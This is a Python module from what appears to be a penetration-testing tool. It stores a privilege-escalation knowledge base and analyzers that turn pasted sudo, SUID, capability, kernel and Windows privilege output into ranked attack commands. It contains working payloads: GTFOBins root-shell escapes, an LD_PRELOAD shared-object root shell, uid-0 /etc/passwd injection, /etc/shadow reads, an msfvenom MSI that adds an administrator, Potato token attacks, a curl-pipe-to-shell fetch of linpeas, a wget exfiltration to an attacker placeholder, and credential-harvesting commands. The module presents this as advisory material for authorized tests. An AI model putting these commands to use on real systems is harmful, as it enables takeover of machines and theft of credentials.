"""Privilege-escalation knowledge base + output analyzers.

This is the brain behind the Post-Exploitation panel ("you're IN the box").
It is deliberately pure: no textual, no subprocess, no network. Just data +
functions, so it can be unit-tested headlessly and reused anywhere.

Two halves
----------
1. Reference material (OS-aware), for when you first land a shell:
     - enum_steps(os)        : the enumeration command checklist
     - interesting_files(os) : files worth grabbing / inspecting
     - GTFOBINS              : sudo / SUID / capability escapes per binary

2. Analyzers — paste real tool output, get ranked, concrete next steps:
     - analyze_sudo(text)         : `sudo -l`
     - analyze_suid(text)         : `find / -perm -4000 ...`
     - analyze_capabilities(text) : `getcap -r / 2>/dev/null`
     - analyze_kernel(text)       : `uname -a` / kernel version
     - analyze_windows(text)      : `whoami /priv`, systeminfo, etc.
     - analyze(text, os_hint)     : runs the relevant analyzers + merges

Everything is advisory. vulnscout never executes any of this — the operator
copies a command and runs it themselves, on a target they are authorized to
test. References point at GTFOBins / exploit-db so the user can verify.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Data shapes
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class EnumStep:
    """One enumeration command to run after getting a foothold."""

    category: str
    command: str
    why: str


@dataclass
class Suggestion:
    """A ranked, actionable escalation lead produced by an analyzer."""

    title: str
    command: str
    why: str = ""
    reference: str = ""
    confidence: str = "medium"   # high | medium | check
    category: str = "misc"       # sudo | suid | kernel | capabilities | cron | creds | windows | misc

    @property
    def rank(self) -> int:
        return {"high": 0, "medium": 1, "check": 2}.get(self.confidence, 1)

    def key(self) -> Tuple[str, str]:
        """Dedup key — same lead surfaced by two analyzers collapses."""
        return (self.category, self.command or self.title)


CONFIDENCE_ORDER = ("high", "medium", "check")


# ---------------------------------------------------------------------------
# GTFOBins — sudo / SUID / capability escapes for common binaries
# ---------------------------------------------------------------------------
#
# Keys are binary basenames. Each value may carry "sudo", "suid", and/or
# "cap" command strings. These are the canonical GTFOBins escapes; verify at
# https://gtfobins.github.io/gtfobins/<binary>/ before relying on one.

GTFOBINS: Dict[str, Dict[str, str]] = {
    "bash":   {"sudo": "sudo bash", "suid": "./bash -p"},
    "sh":     {"sudo": "sudo sh", "suid": "./sh -p"},
    "dash":   {"sudo": "sudo dash", "suid": "./dash -p"},
    "zsh":    {"sudo": "sudo zsh", "suid": "./zsh"},
    "ksh":    {"sudo": "sudo ksh", "suid": "./ksh -p"},
    "find":   {"sudo": "sudo find . -exec /bin/sh \\; -quit",
               "suid": "./find . -exec /bin/sh -p \\; -quit"},
    "vim":    {"sudo": "sudo vim -c ':!/bin/sh'",
               "suid": "./vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'"},
    "vi":     {"sudo": "sudo vi -c ':!/bin/sh'"},
    "view":   {"sudo": "sudo view -c ':!/bin/sh'"},
    "nano":   {"sudo": "sudo nano   # then Ctrl-R Ctrl-X:  reset; sh 1>&0 2>&0"},
    "pico":   {"sudo": "sudo pico   # then Ctrl-R Ctrl-X:  reset; sh 1>&0 2>&0"},
    "less":   {"sudo": "sudo less /etc/profile   # then type:  !/bin/sh"},
    "more":   {"sudo": "TERM= sudo more /etc/profile   # then type:  !/bin/sh"},
    "man":    {"sudo": "sudo man man   # then type:  !/bin/sh"},
    "awk":    {"sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
               "suid": "./awk 'BEGIN {system(\"/bin/sh\")}'"},
    "gawk":   {"sudo": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'",
               "suid": "./gawk 'BEGIN {system(\"/bin/sh\")}'"},
    "nawk":   {"sudo": "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"},
    "perl":   {"sudo": "sudo perl -e 'exec \"/bin/sh\";'",
               "suid": "./perl -e 'exec \"/bin/sh\";'"},
    "python": {"sudo": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
               "suid": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    "python2":{"sudo": "sudo python2 -c 'import os; os.system(\"/bin/sh\")'",
               "suid": "./python2 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    "python3":{"sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
               "suid": "./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    "ruby":   {"sudo": "sudo ruby -e 'exec \"/bin/sh\"'"},
    "php":    {"sudo": "sudo php -r 'system(\"/bin/sh\");'"},
    "lua":    {"sudo": "sudo lua -e 'os.execute(\"/bin/sh\")'"},
    "node":   {"sudo": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"},
    "env":    {"sudo": "sudo env /bin/sh", "suid": "./env /bin/sh -p"},
    "tar":    {"sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
    "zip":    {"sudo": "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'"},
    "gdb":    {"sudo": "sudo gdb -nx -ex '!sh' -ex quit",
               "suid": "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"},
    "make":   {"sudo": "sudo make -s --eval=$'x:\\n\\t-'/bin/sh"},
    "nmap":   {"sudo": "sudo nmap --interactive   # then:  !sh   (old nmap only)"},
    "ftp":    {"sudo": "sudo ftp   # then:  !/bin/sh"},
    "ed":     {"sudo": "sudo ed   # then:  !/bin/sh"},
    "sed":    {"sudo": "sudo sed -n '1e exec sh 1>&0' /etc/hosts"},
    "git":    {"sudo": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"},
    "docker": {"sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh   # (docker group needs no sudo)"},
    "mysql":  {"sudo": "sudo mysql -e '\\! /bin/sh'"},
    "mount":  {"sudo": "sudo mount -o bind /bin/sh /bin/mount; sudo mount   # GTFOBins variant"},
    "socat":  {"sudo": "sudo socat stdin exec:/bin/sh"},
    "cp":     {"suid": "# overwrite a root-owned file, e.g. add a uid-0 line to /etc/passwd, then su"},
    "dd":     {"suid": "# write a uid-0 line into /etc/passwd:  echo 'r00t:...:0:0::/root:/bin/sh' | ./dd of=/etc/passwd ..."},
    "tee":    {"sudo": "echo 'r00t:$(openssl passwd -1 pass):0:0::/root:/bin/sh' | sudo tee -a /etc/passwd"},
    "apt-get":{"sudo": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"},
    "systemctl": {"sudo": "# write a malicious unit then: sudo systemctl link / start it  (see GTFOBins)"},
    "busybox": {"sudo": "sudo busybox sh", "suid": "./busybox sh"},
    "openssl": {"suid": "# read root-only files:  ./openssl enc -in /etc/shadow"},
    "cat":    {"suid": "./cat /etc/shadow   # read root-only files"},
    "wget":   {"sudo": "TF=$(mktemp); echo 'data' >$TF; sudo wget --post-file=$TF <attacker>  # exfil as root"},
    "screen": {"suid": "# screen 4.5.0 SUID LPE — see exploit-db 41154"},
}

# Binaries that are SUID-root on a default install — present in almost every
# `find -perm -4000`, so flagging them as "unusual" would be noise.
DEFAULT_SUID = {
    "mount", "umount", "su", "sudo", "passwd", "chsh", "chfn", "newgrp",
    "gpasswd", "ping", "ping6", "fusermount", "fusermount3", "pkexec",
    "ntfs-3g", "at", "ssh-keysign", "dbus-daemon-launch-helper",
    "polkit-agent-helper-1", "snap-confine", "vmware-user-suid-wrapper",
    "chrome-sandbox", "Xorg.wrap", "exim4", "sg", "expiry",
}


# ---------------------------------------------------------------------------
# Kernel exploits — version-matched (verify exact patch level before use)
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class KernelExploit:
    name: str
    cve: str
    min_version: Tuple[int, int, int]   # inclusive
    max_version: Tuple[int, int, int]   # exclusive
    note: str
    reference: str


KERNEL_EXPLOITS: List[KernelExploit] = [
    KernelExploit(
        "DirtyCow", "CVE-2016-5195", (2, 6, 22), (4, 8, 3),
        "COW race → write to read-only memory; clean, reliable LPE.",
        "https://www.exploit-db.com/exploits/40839",
    ),
    KernelExploit(
        "DirtyPipe", "CVE-2022-0847", (5, 8, 0), (5, 16, 11),
        "Overwrite read-only files (e.g. /etc/passwd). Some distros "
        "backported the fix to 5.10.102 / 5.15.25 — verify.",
        "https://dirtypipe.cm4all.com/",
    ),
]


# ---------------------------------------------------------------------------
# Reference checklists
# ---------------------------------------------------------------------------


_LINUX_ENUM: List[EnumStep] = [
    EnumStep("automated", "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
             "linpeas — the one-shot enumerator; run it first if you can fetch it."),
    EnumStep("automated", "./linux-exploit-suggester.sh",
             "Maps the running kernel to known LPE exploits."),
    EnumStep("identity", "id; whoami; sudo -l",
             "Who am I, what groups, and what can I run as root?"),
    EnumStep("sudo", "sudo -l",
             "Sudo rights are the #1 escalation path — check NOPASSWD + GTFOBins."),
    EnumStep("suid", "find / -perm -4000 -type f 2>/dev/null",
             "SUID-root binaries; cross-reference against GTFOBins."),
    EnumStep("sgid", "find / -perm -2000 -type f 2>/dev/null",
             "SGID binaries — occasionally exploitable."),
    EnumStep("capabilities", "getcap -r / 2>/dev/null",
             "File capabilities (cap_setuid+ep is game over)."),
    EnumStep("kernel", "uname -a; cat /etc/os-release",
             "Kernel + distro → kernel exploit candidates."),
    EnumStep("cron", "cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers",
             "Root cron jobs running writable scripts → instant root."),
    EnumStep("writable", "find / -writable -type d 2>/dev/null; find / -perm -o+w -type f 2>/dev/null",
             "World-writable files/dirs, especially ones root touches."),
    EnumStep("path", "echo $PATH",
             "Writable PATH entry before /usr/bin → PATH hijack of SUID/cron."),
    EnumStep("creds", "grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /home /opt /etc 2>/dev/null",
             "Hardcoded creds in web roots, configs, scripts."),
    EnumStep("creds", "cat ~/.bash_history; cat ~/.ssh/id_rsa; cat /home/*/.ssh/id_rsa 2>/dev/null",
             "History files + private SSH keys."),
    EnumStep("network", "ss -tulpn; netstat -tulpn; cat /etc/hosts",
             "Internal-only services bound to 127.0.0.1 to pivot/port-forward."),
    EnumStep("processes", "ps aux --forest; cat /proc/*/cmdline | tr '\\0' ' '",
             "Root processes, especially ones with creds on the command line."),
    EnumStep("nfs", "cat /etc/exports; showmount -e localhost",
             "no_root_squash NFS export → drop a SUID binary as root."),
    EnumStep("groups", "id   # check: docker, lxd, disk, adm, sudo, wheel",
             "Dangerous group membership (docker/lxd/disk = root-equivalent)."),
    EnumStep("containers", "cat /proc/1/cgroup; ls -la /.dockerenv",
             "Am I in a container? Changes the escalation playbook."),
]

_WINDOWS_ENUM: List[EnumStep] = [
    EnumStep("automated", "winpeas.exe   # or:  .\\winPEASany.exe",
             "winPEAS — one-shot Windows enumerator."),
    EnumStep("identity", "whoami /all",
             "Groups + privileges in one shot."),
    EnumStep("privileges", "whoami /priv",
             "SeImpersonate/SeAssignPrimaryToken → Potato; SeBackup/Restore/Debug also win."),
    EnumStep("system", "systeminfo",
             "OS build + hotfixes → kernel/privesc exploit candidates (use wesng)."),
    EnumStep("services", "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\"",
             "Unquoted service paths + weak service binary perms."),
    EnumStep("services", "accesschk.exe /accepteula -uwcqv \"Everyone\" *   # or per-service",
             "Services modifiable by your user → swap the binary."),
    EnumStep("registry", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
             "AlwaysInstallElevated=1 (HKLM+HKCU) → install a SYSTEM MSI."),
    EnumStep("creds", "reg query HKLM /f password /t REG_SZ /s   &   cmdkey /list",
             "Stored passwords in registry / Credential Manager."),
    EnumStep("creds", "dir /s /b *unattend* *sysprep* web.config *.kdbx 2>nul",
             "Unattend/sysprep files and config files leak creds."),
    EnumStep("scheduled", "schtasks /query /fo LIST /v",
             "Scheduled tasks running as SYSTEM off a writable script."),
    EnumStep("patches", "wmic qfe get HotFixID",
             "Installed patches → feed to Watson/wesng for missing-KB exploits."),
]


_INTERESTING_FILES_LINUX: List[Tuple[str, str]] = [
    ("/etc/passwd", "Writable? Add a uid-0 user. Always: enumerate accounts + shells."),
    ("/etc/shadow", "Readable? Crack root's hash offline (hashcat -m 1800)."),
    ("/etc/sudoers", "Readable/writable sudoers or /etc/sudoers.d/* drop-ins."),
    ("/etc/crontab", "Root cron entries calling writable scripts."),
    ("~/.ssh/id_rsa", "Private keys for lateral movement / reconnecting as another user."),
    ("/home/*/.ssh/authorized_keys", "Drop your key in if writable."),
    ("~/.bash_history", "Typed passwords, hostnames, one-liners."),
    ("/var/www/**/config*.php", "DB creds reused for system accounts."),
    ("/opt/**, /srv/**", "Custom apps + their config/creds."),
    (".env / docker-compose.yml / *.kdbx", "App secrets, DB passwords, vaults."),
    ("/var/backups/*", "Old /etc/shadow.bak, passwd backups."),
    ("/root/ (if readable)", "Flags, scripts, keys you weren't meant to see."),
    ("SUID custom binaries", "strings/ltrace them — they often call system() on $PATH."),
]

_INTERESTING_FILES_WINDOWS: List[Tuple[str, str]] = [
    ("C:\\Users\\*\\Desktop, \\Documents", "Flags, notes, password spreadsheets."),
    ("C:\\Windows\\Panther\\Unattend.xml", "Plaintext/base64 local-admin password."),
    ("C:\\inetpub\\wwwroot\\web.config", "Connection strings + creds."),
    ("*.kdbx (KeePass)", "Password vault — crack with keepass2john + hashcat."),
    ("C:\\Windows\\System32\\config\\SAM + SYSTEM", "Dump hashes (SeBackup) → pass-the-hash."),
    ("%USERPROFILE%\\.aws\\credentials, .ssh\\", "Cloud + SSH keys."),
    ("PowerShell history (ConsoleHost_history.txt)", "Typed commands + creds."),
    ("cmdkey /list + Credential Manager", "Runas /savecred opportunities."),
    ("Registry: AlwaysInstallElevated, Autologon", "Stored DefaultPassword, MSI-install-as-SYSTEM."),
]


def enum_steps(os_name: str = "linux") -> List[EnumStep]:
    return _WINDOWS_ENUM if _is_windows(os_name) else _LINUX_ENUM


def interesting_files(os_name: str = "linux") -> List[Tuple[str, str]]:
    return _INTERESTING_FILES_WINDOWS if _is_windows(os_name) else _INTERESTING_FILES_LINUX


def _is_windows(os_name: str) -> bool:
    return "win" in (os_name or "").lower()


# ---------------------------------------------------------------------------
# Analyzers
# ---------------------------------------------------------------------------


_PATH_RE = re.compile(r"(/[\w./+-]+)")
_WORD_RE = re.compile(r"[A-Za-z0-9_.-]+")


def _basenames(text: str) -> List[str]:
    """Every basename of an absolute path appearing in the text."""
    out = []
    for m in _PATH_RE.finditer(text):
        out.append(m.group(1).rstrip("/").rsplit("/", 1)[-1])
    return out


def _gtfo(name: str) -> Tuple[str, Optional[Dict[str, str]]]:
    """Look up a binary in GTFOBINS, tolerating versioned/aliased names.

    Ubuntu's vim is `vim.basic`, python is `python3.8`, etc. Try the exact
    name, then the part before the first dot, then a trailing-version strip.
    """
    for cand in (name, name.split(".")[0], re.sub(r"[0-9.]+$", "", name)):
        spec = GTFOBINS.get(cand)
        if spec:
            return cand, spec
    return name, None


def _adapt(cmd: str, canonical: str, actual: str) -> str:
    """Rewrite a GTFOBins command for the real binary name when it differs
    (e.g. canonical `vim` → actual `vim.basic`)."""
    if canonical == actual or not cmd:
        return cmd
    return cmd.replace(f"./{canonical}", f"./{actual}").replace(
        f"sudo {canonical}", f"sudo {actual}")


def analyze_sudo(text: str) -> List[Suggestion]:
    """Parse `sudo -l` output into escalation suggestions."""
    out: List[Suggestion] = []
    if not text.strip():
        return out
    low = text.lower()

    # Full sudo — nothing else matters.
    if re.search(r"\(\s*all\s*(:\s*all\s*)?\)\s*all", low):
        out.append(Suggestion(
            title="Full sudo access ((ALL) ALL)",
            command="sudo su -    # or: sudo /bin/bash",
            why="Your user may run any command as root.",
            confidence="high", category="sudo",
            reference="https://gtfobins.github.io/",
        ))

    nopasswd = "nopasswd" in low

    # env_keep LD_PRELOAD / LD_LIBRARY_PATH → shared-object injection.
    if "ld_preload" in low:
        out.append(Suggestion(
            title="sudo env_keep+=LD_PRELOAD",
            command=("cat > /tmp/x.c <<'EOF'\n#include <stdlib.h>\n#include <unistd.h>\n"
                     "void _init(){setuid(0);system(\"/bin/sh -p\");}\nEOF\n"
                     "gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c\n"
                     "sudo LD_PRELOAD=/tmp/x.so <any-allowed-binary>"),
            why="LD_PRELOAD is preserved across sudo — preload a root shell.",
            confidence="high", category="sudo",
            reference="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/",
        ))
    if "ld_library_path" in low:
        out.append(Suggestion(
            title="sudo env_keep+=LD_LIBRARY_PATH",
            command="# build a malicious .so a sudo-allowed binary links, point LD_LIBRARY_PATH at it",
            why="Hijack a shared library the allowed binary loads.",
            confidence="high", category="sudo",
            reference="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/",
        ))

    # GTFOBins binaries that appear as allowed commands.
    seen = set()
    for name in _basenames(text):
        cname, spec = _gtfo(name)
        if spec and "sudo" in spec and name not in seen:
            seen.add(name)
            out.append(Suggestion(
                title=f"sudo {name} → shell (GTFOBins)",
                command=_adapt(spec["sudo"], cname, name),
                why=(f"You can run {name} via sudo; it can spawn a shell or "
                     "read/write files as root."
                     + ("  (NOPASSWD — no password needed)" if nopasswd else "")),
                confidence="high", category="sudo",
                reference=f"https://gtfobins.github.io/gtfobins/{cname}/#sudo",
            ))
    return out


def analyze_suid(text: str) -> List[Suggestion]:
    """Parse a SUID listing (`find / -perm -4000 ...` or `ls -la`)."""
    out: List[Suggestion] = []
    if not text.strip():
        return out
    seen = set()
    unusual: List[str] = []
    for name in _basenames(text):
        if name in seen:
            continue
        seen.add(name)
        if name == "pkexec":
            out.append(Suggestion(
                title="pkexec is SUID → PwnKit (CVE-2021-4034)",
                command="# fetch & build PwnKit, then: ./PwnKit",
                why="polkit pkexec local root, works on most 2009-2022 installs.",
                confidence="high", category="suid",
                reference="https://github.com/ly4k/PwnKit",
            ))
            continue
        cname, spec = _gtfo(name)
        if spec and "suid" in spec:
            out.append(Suggestion(
                title=f"SUID {name} → root shell (GTFOBins)",
                command=_adapt(spec["suid"], cname, name),
                why=f"{name} is SUID-root and can run a shell preserving euid 0.",
                confidence="high", category="suid",
                reference=f"https://gtfobins.github.io/gtfobins/{cname}/#suid",
            ))
        elif name not in DEFAULT_SUID and _looks_like_binary(name):
            unusual.append(name)

    if unusual:
        uniq = sorted(set(unusual))[:12]
        out.append(Suggestion(
            title=f"Unusual SUID binaries ({len(uniq)})",
            command="strings <bin>; ltrace <bin>   # look for system()/exec on $PATH",
            why="Non-default SUID-root: " + ", ".join(uniq)
                + ". Check GTFOBins, or reverse for a PATH/command-injection bug.",
            confidence="check", category="suid",
            reference="https://gtfobins.github.io/",
        ))
    return out


def _looks_like_binary(name: str) -> bool:
    if "." in name and not name.endswith((".sh", ".pl", ".py")):
        return False           # skip versioned .so / data files
    return len(name) >= 2 and bool(re.match(r"^[A-Za-z0-9][\w.-]*$", name))


def analyze_capabilities(text: str) -> List[Suggestion]:
    """Parse `getcap` output for dangerous file capabilities."""
    out: List[Suggestion] = []
    for line in text.splitlines():
        m = re.match(r"\s*(/\S+)\s*=?\s*(cap_\w+(?:,cap_\w+)*)\+?(\w+)?", line)
        if not m:
            continue
        path, caps = m.group(1), m.group(2).lower()
        name = path.rstrip("/").rsplit("/", 1)[-1]
        cname = _gtfo(name)[0]
        if "cap_setuid" in caps:
            cmd = {
                "python": f"{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                "python2": f"{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                "python3": f"{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                "perl": f"{path} -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'",
                "ruby": f"{path} -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
                "node": f"{path} -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",{{stdio:[0,1,2]}})'",
            }.get(cname, f"# {name} has cap_setuid+ep → setuid(0) then exec a shell")
            out.append(Suggestion(
                title=f"{name} has cap_setuid+ep",
                command=cmd,
                why="cap_setuid lets the binary drop to uid 0 — instant root.",
                confidence="high", category="capabilities",
                reference="https://gtfobins.github.io/gtfobins/{}/#capabilities".format(name),
            ))
        elif "cap_dac_read_search" in caps or "cap_dac_override" in caps:
            out.append(Suggestion(
                title=f"{name} has {caps}",
                command=f"# use {name} to read /etc/shadow (or write a root-owned file)",
                why="DAC override/read bypasses file permissions — read shadow, write passwd.",
                confidence="high", category="capabilities",
                reference="https://gtfobins.github.io/",
            ))
        elif "cap_sys_admin" in caps or "cap_sys_ptrace" in caps:
            out.append(Suggestion(
                title=f"{name} has {caps}",
                command="# powerful capability — research the specific abuse path",
                why="cap_sys_admin/ptrace can often be leveraged to root.",
                confidence="check", category="capabilities",
                reference="https://man7.org/linux/man-pages/man7/capabilities.7.html",
            ))
    return out


_KERNEL_RE = re.compile(r"\b(\d+)\.(\d+)\.(\d+)")


def parse_kernel_version(text: str) -> Optional[Tuple[int, int, int]]:
    """Extract the first X.Y.Z version triple (uname output, or bare ver)."""
    m = _KERNEL_RE.search(text)
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2)), int(m.group(3)))


def analyze_kernel(text: str) -> List[Suggestion]:
    """Map a kernel version to candidate LPE exploits."""
    out: List[Suggestion] = []
    ver = parse_kernel_version(text)
    if ver is None:
        return out
    vstr = ".".join(map(str, ver))
    for ex in KERNEL_EXPLOITS:
        if ex.min_version <= ver < ex.max_version:
            out.append(Suggestion(
                title=f"{ex.name} ({ex.cve})",
                command=f"searchsploit {ex.cve}   # kernel {vstr}",
                why=ex.note + "  ⚠ kernel exploits can panic the box — confirm the exact patch level.",
                confidence="check", category="kernel",
                reference=ex.reference,
            ))
    # Always offer the catch-all suggester.
    out.append(Suggestion(
        title=f"Enumerate kernel exploits for {vstr}",
        command=f"linux-exploit-suggester.sh   # or: searchsploit linux kernel {ver[0]}.{ver[1]}",
        why="Map the exact kernel build to public LPEs before trying anything.",
        confidence="check", category="kernel",
        reference="https://github.com/The-Z-Labs/linux-exploit-suggester",
    ))
    return out


# Windows token privileges that hand you SYSTEM.
_WIN_PRIVS = {
    "seimpersonateprivilege": (
        "SeImpersonate → Potato",
        "PrintSpoofer.exe -i -c cmd   # or GodPotato / JuicyPotatoNG",
        "Impersonate a SYSTEM token via named-pipe coercion.",
        "https://github.com/itm4n/PrintSpoofer",
    ),
    "seassignprimarytokenprivilege": (
        "SeAssignPrimaryToken → Potato",
        "GodPotato -cmd \"cmd /c whoami\"",
        "Assign a primary token — same Potato family as SeImpersonate.",
        "https://github.com/BeichenDream/GodPotato",
    ),
    "sebackupprivilege": (
        "SeBackup → dump SAM/SYSTEM",
        "reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive   # then secretsdump",
        "Read any file → grab the hashes and pass-the-hash.",
        "https://github.com/k4sth4/SeBackupPrivilege",
    ),
    "serestoreprivilege": (
        "SeRestore → overwrite protected files",
        "# overwrite a service binary / utilman.exe and trigger it",
        "Write any file → replace a SYSTEM-run binary.",
        "https://github.com/xct/SeRestoreAbuse",
    ),
    "setakeownershipprivilege": (
        "SeTakeOwnership → own + replace a SYSTEM binary",
        "takeown /f C:\\Windows\\System32\\Utilman.exe",
        "Take ownership of a binary launched as SYSTEM, then swap it.",
        "https://book.hacktricks.xyz/",
    ),
    "sedebugprivilege": (
        "SeDebug → inject into a SYSTEM process",
        "# mimikatz sekurlsa / process injection into a SYSTEM PID",
        "Debug any process — dump LSASS or inject a SYSTEM shell.",
        "https://book.hacktricks.xyz/",
    ),
    "seloaddriverprivilege": (
        "SeLoadDriver → load a vulnerable driver",
        "# load Capcom.sys / a known vulnerable driver, then exploit it",
        "Load a kernel driver → ring-0.",
        "https://book.hacktricks.xyz/",
    ),
}


def analyze_windows(text: str) -> List[Suggestion]:
    """Parse `whoami /priv`, `whoami /all`, systeminfo, reg queries."""
    out: List[Suggestion] = []
    low = text.lower()
    for token, (title, cmd, why, ref) in _WIN_PRIVS.items():
        if token in low and ("enabled" in low or "disabled" in low or "priv" in low or token in low):
            # Only flag privileges that are present (whoami /priv lists them).
            out.append(Suggestion(
                title=title, command=cmd, why=why,
                confidence="high", category="windows", reference=ref,
            ))
    if "alwaysinstallelevated" in low and ("0x1" in low or "reg_dword    0x1" in low):
        out.append(Suggestion(
            title="AlwaysInstallElevated = 1",
            command=("msfvenom -p windows/x64/exec CMD='net user hax Pass123! /add & "
                     "net localgroup administrators hax /add' -f msi -o evil.msi & "
                     "msiexec /quiet /qn /i evil.msi"),
            why="Any user can install an MSI as SYSTEM (needs HKLM+HKCU both = 1).",
            confidence="high", category="windows",
            reference="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation",
        ))
    # Membership in dangerous groups.
    for grp, note in (("administrators", "you're already a local admin — UAC bypass for full token"),
                      ("backup operators", "SeBackup-equivalent — dump SAM/SYSTEM"),
                      ("dnsadmins", "DLL injection into the DNS service → SYSTEM")):
        if grp in low:
            out.append(Suggestion(
                title=f"Member of '{grp.title()}'",
                command="# see reference for the group-specific abuse",
                why=note, confidence="medium", category="windows",
                reference="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation",
            ))
    return out


def analyze(text: str, os_hint: str = "linux") -> List[Suggestion]:
    """Run the relevant analyzers over a blob of pasted output and merge.

    Works on focused output (`sudo -l` alone) or a full linpeas/winpeas
    dump — every analyzer is tolerant of unrelated lines. Results are
    deduped and sorted high→check.
    """
    suggestions: List[Suggestion] = []
    if _is_windows(os_hint):
        suggestions += analyze_windows(text)
    else:
        suggestions += analyze_sudo(text)
        suggestions += analyze_suid(text)
        suggestions += analyze_capabilities(text)
        suggestions += analyze_kernel(text)

    # Dedup keeping the highest-confidence instance of each lead.
    best: Dict[Tuple[str, str], Suggestion] = {}
    for s in suggestions:
        k = s.key()
        if k not in best or s.rank < best[k].rank:
            best[k] = s
    return sorted(best.values(), key=lambda s: (s.rank, s.category, s.title))
